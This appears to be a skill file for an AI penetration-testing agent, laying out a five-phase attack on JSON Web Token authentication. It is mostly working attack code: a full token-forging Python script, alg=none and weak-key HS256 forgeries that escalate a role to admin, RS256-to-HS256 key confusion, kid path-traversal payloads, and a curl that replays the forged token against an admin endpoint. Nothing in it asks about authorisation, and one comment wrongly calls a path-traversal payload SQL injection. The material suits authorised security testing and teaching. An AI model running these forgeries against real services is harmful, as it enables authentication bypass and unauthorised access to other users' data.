---
name: attack-jwt
description: Use when a target authenticates with JWTs and you need to test signature, algorithm, claim, and key-handling weaknesses.
metadata:
  cyberstrike:
    source: .cyberstrike/skill/attack-jwt/SKILL.md
    commit: 359655518
---

# JWT Token Attack

## Objective

Exploit JWT implementation weaknesses to bypass authentication, escalate privileges, or forge tokens.

## Testing Methodology

### Phase 1: Decode & Analyze

```bash
# Automated JWT analysis — jwt_tool (ask the user before installing if missing)
jwt_tool EYTOKEN

# Manual decode
echo "HEADER.PAYLOAD.SIG" | cut -d. -f1 | base64 -d 2>/dev/null
echo "HEADER.PAYLOAD.SIG" | cut -d. -f2 | base64 -d 2>/dev/null
```

Check for:
- Algorithm (`alg` field): RS256, HS256, none
- Claims: `role`, `is_admin`, `sub`, `exp`, `aud`, `iss`
- Key ID (`kid`): SQL injection, path traversal potential

All tamper commands below use a small reusable forging script — save it once:

```bash
cat > /tmp/jwt_forge.py <<'EOF'
#!/usr/bin/env python3
"""Decode a JWT, tamper header/payload claims, and re-encode (alg=none or HS256-signed)."""
import argparse, base64, json, hmac, hashlib

def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64u_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

p = argparse.ArgumentParser()
p.add_argument("token")
p.add_argument("--header", action="append", default=[], help="k=v, applied to the JWT header")
p.add_argument("--payload", action="append", default=[], help="k=v, applied to the JWT payload")
p.add_argument("--sign", choices=["none", "hs256"], default="none")
p.add_argument("--key", help="path to secret/PEM file, required for --sign hs256")
args = p.parse_args()

h_b64, p_b64, _ = args.token.split(".")
header = json.loads(b64u_decode(h_b64))
payload = json.loads(b64u_decode(p_b64))

for kv in args.header:
    k, v = kv.split("=", 1)
    header[k] = v
for kv in args.payload:
    k, v = kv.split("=", 1)
    payload[k] = v

if args.sign == "none":
    header["alg"] = "none"

new_h, new_p = b64u(json.dumps(header).encode()), b64u(json.dumps(payload).encode())
signing_input = f"{new_h}.{new_p}".encode()

if args.sign == "hs256":
    key = open(args.key, "rb").read()
    sig = b64u(hmac.new(key, signing_input, hashlib.sha256).digest())
else:
    sig = ""

print(f"{new_h}.{new_p}.{sig}")
EOF
```

### Phase 2: Algorithm Attacks

```bash
# Generate alg=none token
python3 /tmp/jwt_forge.py EYTOKEN --sign none

# Role escalation
python3 /tmp/jwt_forge.py EYTOKEN --payload role=admin --sign none

# User ID swap
python3 /tmp/jwt_forge.py EYTOKEN --payload sub=1 --sign none

# HS256 with known/weak key
python3 /tmp/jwt_forge.py EYTOKEN --payload role=admin --sign hs256 --key <(echo -n "secret")
```

### Phase 3: Key Confusion (RS256 → HS256)

If server uses RS256, try signing with the public key as HS256 secret:

```bash
# Fetch public key
curl -s https://TARGET/.well-known/jwks.json

# Convert JWK to PEM (e.g. via jwt_tool's JWK-to-PEM helper or manual conversion),
# then sign HS256 using the PEM bytes as the HMAC secret
python3 /tmp/jwt_forge.py EYTOKEN --payload role=admin --sign hs256 --key public.pem
```

### Phase 4: kid Injection

```bash
# SQL injection via kid
python3 /tmp/jwt_forge.py EYTOKEN --header 'kid=../../../../../../dev/null'

# kid pointing to accessible file
python3 /tmp/jwt_forge.py EYTOKEN --header 'kid=/proc/sys/kernel/hostname'
```

### Phase 5: Verify Impact

```bash
# Test tampered token
curl -s -H "Authorization: Bearer TAMPERED_TOKEN" https://TARGET/api/admin/users
```

## What Constitutes a Finding

| Attack | Severity |
|--------|----------|
| alg=none accepted — auth bypass | Critical (P1) |
| Role escalation via claim tampering | Critical (P1) |
| RS256→HS256 key confusion | Critical (P1) |
| Weak signing key (crackable) | High (P2) |
| kid SQL injection | Critical (P1) |
| Expired tokens accepted | Medium (P3) |

## Evidence Requirements

- Original JWT decoded (header + payload)
- Tampered JWT with modified claims
- Server response accepting tampered token
- Proof of elevated access (admin data, other user data)

## Tools

- `/tmp/jwt_forge.py` (python3, defined in Phase 1) or `jwt_tool` — automated decode/tamper/re-encode
- `jwt_tool` (external) — comprehensive JWT testing
- `hashcat -m 16500` — JWT secret cracking

## References

- [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
